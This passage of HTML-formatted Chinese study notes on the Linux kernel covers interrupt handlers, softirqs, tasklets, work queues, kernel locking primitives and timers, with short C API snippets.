title="中断处理程序"></a>中断处理程序</h3><p>在响应一个特定中断的时候，内核会执行一个函数，该函数叫做中断处理程序或中断服务例程。一个设备的中断处理程序是它设备驱动程序的一部分——设备驱动程序是用于对设备进行管理的内核代码。</p><p>中断处理程序与其他内核函数的区别在于：中断处理程序是被内核调用来响应中断的，而它们运行于我们称之为中断上下文的特殊上下文中。中断上下文也称作原子上下文，该上下文中的执行代码不可阻塞。</p><h3 id="上半部与下半部的对比"><a href="#上半部与下半部的对比" class="headerlink" title="上半部与下半部的对比"></a>上半部与下半部的对比</h3><p>中断处理程序是上半部——接收到一个中断，它就立即开始执行，但只做有严格时限的工作，例如对接受的中断进行应答或复位硬件，这些工作都是在所有中断被禁止的情况下完成的。能够被允许稍后完成的工作会推迟到下半部去。</p><h3 id="注册中断处理程序"><a href="#注册中断处理程序" class="headerlink" title="注册中断处理程序"></a>注册中断处理程序</h3><p>驱动程序可以通过request_irq()函数注册一个中断处理程序（声明在&lt;linux/interrupt.h&gt;中）。</p><h4 id="中断处理程序标志"><a href="#中断处理程序标志" class="headerlink" title="中断处理程序标志"></a>中断处理程序标志</h4><p>定义于&lt;linux/interrupt.h&gt;中。</p><h3 id="释放中断处理程序"><a href="#释放中断处理程序" class="headerlink" title="释放中断处理程序"></a>释放中断处理程序</h3><p>卸载驱动程序时，需要注销相应的中断处理程序，并释放中断线：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_irq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> irq, <span class="keyword">void</span> *dev)</span></span></span><br></pre></td></tr></table></figure><h3 id="中断上下文"><a href="#中断上下文" class="headerlink" title="中断上下文"></a>中断上下文</h3><h3 id="中断处理机制的实现"><a href="#中断处理机制的实现" class="headerlink" title="中断处理机制的实现"></a>中断处理机制的实现</h3><p><img src="./img/1585836310.png" alt="中断从硬件到内核的路径"></p><h3 id="proc-interrupts"><a href="#proc-interrupts" class="headerlink" title="/proc/interrupts"></a>/proc/interrupts</h3><p>该文件存放的是系统中与中断相关的统计信息。</p><p>procfs代码位于fs/proc中。</p><h3 id="中断控制"><a href="#中断控制" class="headerlink" title="中断控制"></a>中断控制</h3><h4 id="禁止和激活中断"><a href="#禁止和激活中断" class="headerlink" title="禁止和激活中断"></a>禁止和激活中断</h4><p>禁止：local_irq_disable();</p><p>激活：local_irq_enable();</p><h2 id="下半部和推后执行的工作"><a href="#下半部和推后执行的工作" class="headerlink" title="下半部和推后执行的工作"></a>下半部和推后执行的工作</h2><p>中断处理流程被分为两部分：第一部分是中断处理程序，内核通过对它的异步执行完成对硬件中断的即时响应；另一部分即为下半部。</p><h3 id="下半部"><a href="#下半部" class="headerlink" title="下半部"></a>下半部</h3><h4 id="下半部的起源——bottom-half-BH"><a href="#下半部的起源——bottom-half-BH" class="headerlink" title="下半部的起源——bottom half(BH)"></a>下半部的起源——bottom half(BH)</h4><h4 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h4><h4 id="软中断和tasklet"><a href="#软中断和tasklet" class="headerlink" title="软中断和tasklet"></a>软中断和tasklet</h4><p>软中断是一组静态定义的下半部接口，有32个，可以在所有处理器上同时执行——即使两个类型相同也可以。必须在编译期间就进行静态注册。</p><p>tasklet是一种基于软中断实现的灵活性强、动态创建的下半部实现机制。两个不同类型的tasklet可以在不同的处理器上同时执行，但相同类型的tasklet不能同时执行。可以通过代码进行动态注册。</p><h4 id="工作队列"><a href="#工作队列" class="headerlink" title="工作队列"></a>工作队列</h4><h4 id="内核定时器"><a href="#内核定时器" class="headerlink" title="内核定时器"></a>内核定时器</h4><h3 id="软中断"><a href="#软中断" class="headerlink" title="软中断"></a>软中断</h3><p>软中断的代码位于kernel/softirq.c中。</p><h4 id="软中断的实现"><a href="#软中断的实现" class="headerlink" title="软中断的实现"></a>软中断的实现</h4><p>软中断是在编译期间静态分配的。</p><h5 id="软中断处理程序"><a href="#软中断处理程序" class="headerlink" title="软中断处理程序"></a>软中断处理程序</h5><p>软中断处理程序action的函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">softirq_handler</span><span class="params">(struct softirq_action *)</span></span></span><br></pre></td></tr></table></figure><p>当内核运行一个软中断处理程序的时候，它就会执行这个action函数，其唯一的参数为指向相应softirq_action结构体的指针。</p><h5 id="执行软中断"><a href="#执行软中断" class="headerlink" title="执行软中断"></a>执行软中断</h5><p>一个注册的软中断必须在被标记后才会执行，。这被称作触发软中断。通常，中断处理程序会在返回前标记它的软中断。</p><p>在下列地方，待处理的软中断会被检查和执行：</p><ul><li>从一个硬件中断代码处返回时</li><li>在ksoftirqd内核线程中</li><li>在显示检查和执行待处理的软中断的代码中。如网络子系统</li></ul><p>不管什么办法唤起，软中断都要在do_softirq()中执行。</p><h4 id="使用软中断"><a href="#使用软中断" class="headerlink" title="使用软中断"></a>使用软中断</h4><p>软中断保留给系统中对时间要求最严格以及最重要的下半部使用。</p><h5 id="分配索引"><a href="#分配索引" class="headerlink" title="分配索引"></a>分配索引</h5><p>索引号小的软中断在索引号大的软中断之前执行。</p><p>建立一个新的软中断必须在&lt;linux/interrupt.h&gt;中定义的一个枚举类型中加入新的项。</p><h5 id="注册处理程序"><a href="#注册处理程序" class="headerlink" title="注册处理程序"></a>注册处理程序</h5><p>通过调用open_softirq()注册软中断处理程序，该函数含两个参数：软中断的索引号和处理函数。</p><p>软中断处理程序执行时，允许响应中断，但它自己不能休眠。在一个处理程序运行的时候，当前处理器上的软中断被禁止，但其他的处理器仍可以执行别的软中断。</p><h5 id="触发软中断"><a href="#触发软中断" class="headerlink" title="触发软中断"></a>触发软中断</h5><p>raise_softirq()函数可以将一个软中断设置为挂起状态，让它在下次调用do_softirq()函数时投入运行。</p><h3 id="tasklet"><a href="#tasklet" class="headerlink" title="tasklet"></a>tasklet</h3><h4 id="tasklet的实现"><a href="#tasklet的实现" class="headerlink" title="tasklet的实现"></a>tasklet的实现</h4><h5 id="tasklet结构体"><a href="#tasklet结构体" class="headerlink" title="tasklet结构体"></a>tasklet结构体</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> state;</span><br><span class="line"><span class="keyword">atomic_t</span> count;</span><br><span class="line"><span class="keyword">void</span> (*func)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中state只能在0、TASKLET_STATE_SCHED（已被调度，正准备投入运行）和TASKLET_STATE_RUN（正在运行）之间取值。</p><p>若count不为0，则tasklet被禁止，不允许执行。当count为0时，tasklet被激活，并且在设置为挂起状态时，该tasklet才能够执行。</p><h5 id="调度tasklet"><a href="#调度tasklet" class="headerlink" title="调度tasklet"></a>调度tasklet</h5><p>已调度的tasklet存放在两个单处理器数据结构：tasklet_vec（普通）和tasklet_hi_vec（高优先级）。这两个数据结构都是由tasklet_struct结构体构成的量表。链表中每个tasklet_struct代表一个不同的tasklet。</p><p>tasklet由tasklet_schedule()和tasklet_hi_scheduler()函数进行调度。</p><p>tasklet_schedule()的执行步骤：</p><ol><li>检查tasklet的状态是否为TASKLET_STATE_SCHED。如果是，说明tasklet已被调度过了，函数立即返回。</li><li>调用_tasklet_schedule()。</li><li>保存中断状态，然后禁止本地中断。</li><li>把需要调度的tasklet加到每个处理器一个的tasklet_vec链表或tasklet_hi_vec链表的表头上去。</li><li>唤起TASKLET_SOFTIRQ或HI_SOFTIRQ软中断，这样在下一次调用do_softirq()时就会执行该tasklet。</li><li>恢复中断到原状态并返回。</li></ol><p>tasklet_action()和tasklet_hi_action()：</p><ol><li>禁止中断，并为当前处理器检索tasklet_vec或tasklet_hig_vec链表。</li><li>将当前处理器上的该链表设置为NULL，达到清空的效果。</li><li>允许响应中断。</li><li>循环遍历获得链表上的每一个待处理的tasklet。</li><li>如果是多处理器系统，通过检查TASKLET_STATE_RUN来判断这个tasklet是否正在其他处理器上运行。如果它正在运行，那么现在就不要执行，跳到下一个待处理器的tasklet去。</li><li>如果当前这个tasklet没有执行，将其状态设置为TASKLET_STATE_RUN。</li><li>检查count值是否为0，确保tasklet没有被禁止；如果被禁止了，则跳转到下一个挂起的tasklet去。</li><li>执行tasklet的处理器程序。</li><li>tasklet运行完毕，清楚state域的TASK_STATE_RUN状态标志。</li><li>重复执行下一个tasklet，直至没有剩余等待处理的tasklet。</li></ol><h4 id="使用tasklet"><a href="#使用tasklet" class="headerlink" title="使用tasklet"></a>使用tasklet</h4><h5 id="声明一个tasklet"><a href="#声明一个tasklet" class="headerlink" title="声明一个tasklet"></a>声明一个tasklet</h5><p>静态创建（&lt;linux/interruot.h&gt;中定义）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DECLARE_TASKLET(name, func, data);<span class="comment">//count = 0</span></span><br><span class="line">DECLARE_TASKLET_DISABLED(name, func, data);<span class="comment">//count = 1</span></span><br></pre></td></tr></table></figure><p>动态创建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklet_init(t, tasklet_handler, dev);</span><br></pre></td></tr></table></figure><h5 id="编写tasklet处理程序"><a href="#编写tasklet处理程序" class="headerlink" title="编写tasklet处理程序"></a>编写tasklet处理程序</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tasklet_handler</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span></span><br></pre></td></tr></table></figure><h5 id="调度tasklet-1"><a href="#调度tasklet-1" class="headerlink" title="调度tasklet"></a>调度tasklet</h5><p>一个tasklet总在调度它的处理器上执行，以希望能更好地利用处理器的高速缓存。</p><p>可以调用tasklet_disable()来禁止某个指定的tasklet（若该tasklet正在执行，这个函数会等到它执行完毕再返回）。tasklet_disable_nosync()函数也可以用来禁止，无须在返回前等待tasklet执行完毕。</p><p>tasklet_enable()可以激活一个tasklet。</p><p>tasklet_kill()函数可以从挂起的队列中去掉一个tasklet。这个函数首先等待该tasklet执行完毕，然后再将它移去。</p><h5 id="ksoftirqd"><a href="#ksoftirqd" class="headerlink" title="ksoftirqd"></a>ksoftirqd</h5><p>每个cpu上都分配有一个ksoftirqd/n线程。一旦该线程被初始化，会执行死循环（优先级较低）。只要有待处理的软中断，ksoftirqd就会调用do_softirq()去处理。当所有需要执行的操作都完成以后，该内核线程将自己设置为TASK_INTERRUPTIBLE状态，唤起调度程序选择其他可执行进程投入运行。</p><p>只要do_softirq()函数发现一家执行过的内核线程重新出发了它自己，软中断内核线程就会被唤醒。</p><h4 id="老的BH机制"><a href="#老的BH机制" class="headerlink" title="老的BH机制"></a>老的BH机制</h4><h3 id="工作队列-1"><a href="#工作队列-1" class="headerlink" title="工作队列"></a>工作队列</h3><p>工作队列可以把工作推后，交由一个内核线程去执行。工作队列允许重新调度甚至是睡眠。</p><h4 id="工作队列的实现"><a href="#工作队列的实现" class="headerlink" title="工作队列的实现"></a>工作队列的实现</h4><p>工作队列子系统是一个用于创建内核线程的接口，通过它创建的进程负责执行由内核其他部分排到队列里的任务。创建的这些内核线程称作工作者线程。</p><h5 id="表示线程的数据结构"><a href="#表示线程的数据结构" class="headerlink" title="表示线程的数据结构"></a>表示线程的数据结构</h5><p>工作者线程的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu_workqueue_strcut</span> <span class="title">cpu_wq</span>[<span class="title">NR_CPUS</span>];</span><span class="comment">//定义在kernel/workqueue.c中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line"><span class="keyword">int</span> sinqlethread;</span><br><span class="line"><span class="keyword">int</span> freezeable;</span><br><span class="line"><span class="keyword">int</span> rt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="表示工作的数据结构"><a href="#表示工作的数据结构" class="headerlink" title="表示工作的数据结构"></a>表示工作的数据结构</h5><p>工作用&lt;linux/workqueue.h&gt;中定义的work_struct结构体表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span>&#123;</span></span><br><span class="line"><span class="keyword">atomic_long_t</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span></span><br><span class="line"><span class="keyword">work_func_t</span> func;</span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure><p>worker_thread()：</p><ol><li>线程将自己设置为休眠状态，并把自己加入到等待队列中。</li><li>如果工作链表是空的，线程调用schedule()函数进入睡眠状态。</li><li>如果链表中有对象，线程不会睡眠，它将自己设置成TASK_RUNNING，脱离等待队列。</li><li>如果链表非空，调用run_workqueue()函数执行被推后的工作。</li></ol><p>run_workqueue()函数遍历链表上每个待处理的工作，执行链表每个节点上的workqueue_struct中的func成员。</p><p><img src="./img/1586338843.png" alt="工作、工作队列和工作者线程之间的关系"></p><h4 id="使用工作队列"><a href="#使用工作队列" class="headerlink" title="使用工作队列"></a>使用工作队列</h4><h5 id="创建推后的工作"><a href="#创建推后的工作" class="headerlink" title="创建推后的工作"></a>创建推后的工作</h5><p>静态创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECLARE_WORK(name, <span class="keyword">void</span> (*func) (<span class="keyword">void</span> *), <span class="keyword">void</span> *data);</span><br></pre></td></tr></table></figure><p>动态创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INIT_WORK(struct work_struct *work, <span class="keyword">void</span>(*func) (<span class="keyword">void</span> *), <span class="keyword">void</span> *data)</span><br></pre></td></tr></table></figure><h5 id="工作队列处理函数"><a href="#工作队列处理函数" class="headerlink" title="工作队列处理函数"></a>工作队列处理函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">work_handler</span><span class="params">(<span class="keyword">void</span> *data)</span></span></span><br></pre></td></tr></table></figure><h5 id="对工作进程调度"><a href="#对工作进程调度" class="headerlink" title="对工作进程调度"></a>对工作进程调度</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schedule_work(&amp;work);<span class="comment">//立即执行</span></span><br><span class="line"></span><br><span class="line">schedule_delayed_work(&amp;work, <span class="built_in">delay</span>);<span class="comment">//延迟执行</span></span><br></pre></td></tr></table></figure><h5 id="刷新操作"><a href="#刷新操作" class="headerlink" title="刷新操作"></a>刷新操作</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flush_scheduled_work</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>执行后函数会一直等到，直到队列中所有对象都被执行以后才返回。</p><p>注：该函数并不取消任何延迟执行任务。取消延迟执行工作应调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cancel_delayed_work</span><span class="params">(struct work_struct *work)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="创建新的工作队列"><a href="#创建新的工作队列" class="headerlink" title="创建新的工作队列"></a>创建新的工作队列</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct workqueue_struct *<span class="title">create_workqueue</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br></pre></td></tr></table></figure><p>调度：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">queue_work</span><span class="params">(struct workqueue_struct *wq, struct work_struct *work)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">queue_delat_work</span><span class="params">(struct workqueue_struct *wq, struct work_struct *work,unsignde <span class="keyword">long</span> <span class="built_in">delay</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>刷新：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flush_workqueue(struct workqueue_struct *wq);</span><br></pre></td></tr></table></figure><h2 id="内核同步介绍"><a href="#内核同步介绍" class="headerlink" title="内核同步介绍"></a>内核同步介绍</h2><h3 id="临界区和条件竞争"><a href="#临界区和条件竞争" class="headerlink" title="临界区和条件竞争"></a>临界区和条件竞争</h3><p>临界区就是访问和操作共享数据的代码段。</p><p>避免并发和防止条件竞争称为同步。</p><h3 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h3><p>内核中造成并发执行的原因：</p><ul><li>中断</li><li>软中断和tasklet</li><li>内核抢占</li><li>睡眠及用户空间的同步</li><li>对称多处理</li></ul><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><h3 id="争用和扩展性"><a href="#争用和扩展性" class="headerlink" title="争用和扩展性"></a>争用和扩展性</h3><p>锁的争用（简称争用），是指当锁正在被占用时，有其他线程试图获得该锁。</p><h2 id="内核同步方法"><a href="#内核同步方法" class="headerlink" title="内核同步方法"></a>内核同步方法</h2><h3 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h3><p>原子操作即不能被分割的指令。</p><h4 id="原子整数操作"><a href="#原子整数操作" class="headerlink" title="原子整数操作"></a>原子整数操作</h4><p>针对整数的原子操作只能对atomic_t类型的数据进行处理。atomic_t类型定义在&lt;linux/types.h&gt;中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> counter;</span><br><span class="line">&#125; <span class="keyword">atomic_t</span>;</span><br></pre></td></tr></table></figure><p>原子整数操作的声明都在&lt;asm/atomic.h&gt;中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atomic_set(&amp;v,<span class="number">4</span>);<span class="comment">//v = 4;</span></span><br><span class="line">atomic_add(<span class="number">2</span>,&amp;v);<span class="comment">//v = v + 2;</span></span><br><span class="line">atomic_inc(&amp;v);<span class="comment">//v = v + 1;</span></span><br></pre></td></tr></table></figure><p>可用atomic_read()将atomic_t转换为int型。</p><h4 id="64位原子操作"><a href="#64位原子操作" class="headerlink" title="64位原子操作"></a>64位原子操作</h4><p>atomic64_t：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">long</span> counter;</span><br><span class="line">&#125; <span class="keyword">atomic64_t</span>;</span><br></pre></td></tr></table></figure><h4 id="原子位操作"><a href="#原子位操作" class="headerlink" title="原子位操作"></a>原子位操作</h4><p>定义在&lt;asm/bitops.h&gt;中。</p><h3 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h3><p>自旋锁最多只能被一个可执行线程持有。</p><p>一个被争用的自旋锁使得请求它的线程在等待锁重新可用时自旋。</p><h4 id="自旋锁方法"><a href="#自旋锁方法" class="headerlink" title="自旋锁方法"></a>自旋锁方法</h4><p>自旋锁的实现与体系结构密切相关，与体系结构相关的代码定义在&lt;asm/spinlock.h&gt;中，接口定义在&lt;linux/spinlock.h&gt;中。自旋锁的基本使用形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DEFINE_SPINLOCK(mr_lock);</span><br><span class="line">spin_lock(&amp;mr_lock);</span><br><span class="line">...</span><br><span class="line">spin_unlock(&amp;mr_lock);</span><br></pre></td></tr></table></figure><p>自旋锁可以使用在中断处理程序中。所以在中断处理程序中使用自旋锁时，一定要在获取锁之前，首先禁止本地中断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DEFINE_SPINLOCK(mr_lock);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">spin_lock_irqsave(&amp;mr_lock, flags);</span><br><span class="line">...</span><br><span class="line">spin_unlock_irqrestore(&amp;mr_lock, flags);</span><br></pre></td></tr></table></figure><h4 id="其他针对自旋锁的操作"><a href="#其他针对自旋锁的操作" class="headerlink" title="其他针对自旋锁的操作"></a>其他针对自旋锁的操作</h4><h4 id="自旋锁和下半部"><a href="#自旋锁和下半部" class="headerlink" title="自旋锁和下半部"></a>自旋锁和下半部</h4><h3 id="读-写自旋锁"><a href="#读-写自旋锁" class="headerlink" title="读-写自旋锁"></a>读-写自旋锁</h3><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><p>Linux中的信号量是一种睡眠锁：如果有一个任务试图获得一个不可用（已被占用）的信号量时，信号量会将其推进一个等待队列，然后让其睡眠。当持有的信号量可用（被释放）后，处于等待队列中 的那个任务将被唤醒，并获得该信号量。</p><h4 id="计数信号量和二值信号量"><a href="#计数信号量和二值信号量" class="headerlink" title="计数信号量和二值信号量"></a>计数信号量和二值信号量</h4><p>二值信号量又称互斥信号量。</p><h4 id="创建和初始化信号量"><a href="#创建和初始化信号量" class="headerlink" title="创建和初始化信号量"></a>创建和初始化信号量</h4><p>信号量的实现与体系结构相关，具体定义在&lt;asm/semaphore.h&gt;。</p><h4 id="使用信号量"><a href="#使用信号量" class="headerlink" title="使用信号量"></a>使用信号量</h4><h3 id="读-写信号量"><a href="#读-写信号量" class="headerlink" title="读-写信号量"></a>读-写信号量</h3><p>定义在文件&lt;linux/rwsem.h&gt;中。</p><p>所有的读-写信号量都是互斥信号量。</p><h3 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h3><h3 id="完成变量"><a href="#完成变量" class="headerlink" title="完成变量"></a>完成变量</h3><p>完成变量由结构completion表示，定义在&lt;linux/completion.h&gt;中。</p><h3 id="BKL：大内核锁"><a href="#BKL：大内核锁" class="headerlink" title="BKL：大内核锁"></a>BKL：大内核锁</h3><p>BKL的一些特性：</p><ul><li><p>持有BKL的任务仍然可睡眠。</p></li><li><p>BKL是一种递归锁。</p></li><li><p>BKL只可以用在进程上下文中。</p></li><li><p>新的用户不允许使用BKL</p></li></ul><p>BKL在被持有时同样会禁止内核抢占。</p><h3 id="顺序锁"><a href="#顺序锁" class="headerlink" title="顺序锁"></a>顺序锁</h3><h3 id="禁止抢占"><a href="#禁止抢占" class="headerlink" title="禁止抢占"></a>禁止抢占</h3><h3 id="顺序和屏障"><a href="#顺序和屏障" class="headerlink" title="顺序和屏障"></a>顺序和屏障</h3><p>rmb()方法提供了一个“读”内存屏障，它确保跨越rmb()的载入动作不会发生重排序。</p><p>wmb()方式提供是一个“写”内存屏障，区别仅仅是它是针对存储而非载入——它确保跨越屏障的存储不发生重排序。</p><p>mb()方法既提供了读屏障也提供了写屏障。载入和存储动作都不会跨越屏障重新排序。</p><h2 id="定时器和时间管理"><a href="#定时器和时间管理" class="headerlink" title="定时器和时间管理"></a>定时器和时间管理</h2><p>系统定时器是一种可编程硬件芯片，它能以固定频率产生中断。该中断就是所谓的定时器中断。</p><h3 id="内核中的时间概念"><a href="#内核中的时间概念" class="headerlink" title="内核中的时间概念"></a>内核中的时间概念</h3><h3 id="节拍率：HZ"><a href="#节拍率：HZ" class="headerlink" title="节拍率：HZ"></a>节拍率：HZ</h3><p>内核在&lt;asm/param.h&gt;中定义了这个值</p><h3 id="Jiffies"><a href="#Jiffies" class="headerlink" title="Jiffies"></a>Jiffies</h3><p>全局变量jiffies用来记录自系统启动以来产生的节拍总数。启动时，内核将该变量初始化为0。</p><p>定义在&lt;linux/jiffies.h&gt;中。</p><h4 id="用户空间和HZ"><a href="#用户空间和HZ" class="headerlink" title="用户空间和HZ"></a>用户空间和HZ</h4><h3 id="硬时钟和定时器"><a href="#硬时钟和定时器" class="headerlink" title="硬时钟和定时器"></a>硬时钟和定时器</h3><h4 id="实时时钟"><a href="#实时时钟" class="headerlink" title="实时时钟"></a>实时时钟</h4><p>实时时钟(RTC)是用来持久存放系统时间的设备，即便系统关闭后，它也可以靠主板上的微型电池提供的电力保持系统的计时。在PC体系结构中，RTC和CMOS集成在一起，而且RTC的运行和BIOS的保持设置都是通过一个电池供电的。</p><h4 id="系统定时器"><a href="#系统定时器" class="headerlink" title="系统定时器"></a>系统定时器</h4><p>在x86体系结构中，主要采用可编程中断时钟(PIT)。PIT在PC机器中普遍存在。内核在启动时对PIT进行编程初始化，使其能够以HZ/秒的频率产生时钟中断。</p><h3 id="时钟中断处理程序"><a href="#时钟中断处理程序" class="headerlink" title="时钟中断处理程序"></a>时钟中断处理程序</h3><p>时钟中断处理程序可以划分为两个部分：体系结构相关部分和体系结构无关部分。</p><p>与体系结构相关的例程作为系统定时器的中断处理程序而注册到内核中，以便在产生时钟中断时，它能够相应地运行：</p><ul><li>获得xtime_lock锁，以便对访问jiffies_64和墙上时间xtime进行保护。</li><li>需要时应答或重新设置系统时钟。</li><li>周期性地使用墙上时间更新实时时钟。</li><li>调用体系结构无关的时钟例程：tick_periodic()。</li></ul><p>中断处理程序主要通过调用与体系结构无关的例程，tick_periodic()执行下面更多工作：</p><ul><li>给jiffies_64变量加一。</li><li>更新资源消耗的统计值，比如当前进程所消耗的系统时间和用户时间。</li><li>执行已经到期的动态定时器。</li><li>执行sheduler_tick()函数。</li><li>更新墙上时间，该时间存放在xtime变量中。</li><li>计算平均负载值。</li></ul><h3 id="实际时间"><a href="#实际时间" class="headerlink" title="实际时间"></a>实际时间</h3><p>当前实际时间（墙上时间）定义在文件kernel/time/timekeeping.c中。</p><h3 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h3><h4 id="使用定时器"><a href="#使用定时器" class="headerlink" title="使用定时器"></a>使用定时器</h4><p>当前节拍计数等于或大于指定超时时，内核就开始执行定时器处理函数。</p><p>当del_timer()返回后，可以保证的只是将来不会再被激活，但是在多处理器机器上的定时器中断可能已经在其他处理器上运行了。</p><h4 id="定时器竞争条件"><a href="#定时器竞争条件" class="headerlink" title="定时器竞争条件"></a>定时器竞争条件</h4><h4 id="实现定时器"><a href="#实现定时器" class="headerlink" title="实现定时器"></a>实现定时器</h4><h3 id="延迟执行"><a href="#延迟执行" class="headerlink" title="延迟执行"></a>延迟执行</h3><h4 id="忙等待"><a href="#忙等待" class="headerlink" title="忙等待"></a>忙等待</h4><p>忙等待（忙循环）的实现很简单——在循环中不断旋转直到希望的时钟节拍数耗尽。</p><h4 id="短延迟"><a href="#短延迟" class="headerlink" title="短延迟"></a>短延迟</h4><h4 id="schedule-timeout"><a href="#schedule-timeout" class="headerlink" title="schedule_timeout()"></a>schedule_timeout()</h4><p>该方法会让需要延迟执行的任务睡眠到指定的延迟时间耗尽后再重新运行。但该方法也不能保证睡眠时间正好等于指定的延迟时间，只能尽量使睡眠时间接近指定的延迟时间。当指定的时间到期后，内核唤醒被延迟的任务并将其重新放回运行队列。</p><p>在调用该方法前，必须首先将任务设置为TASK_INTERRUPTIBLE或TASK_UNINTERRUPTIBLE两种状态之一，否则任务不会睡眠。</p><h5 id="schedule-timeout-的实现"><a href="#schedule-timeout-的实现" class="headerlink" 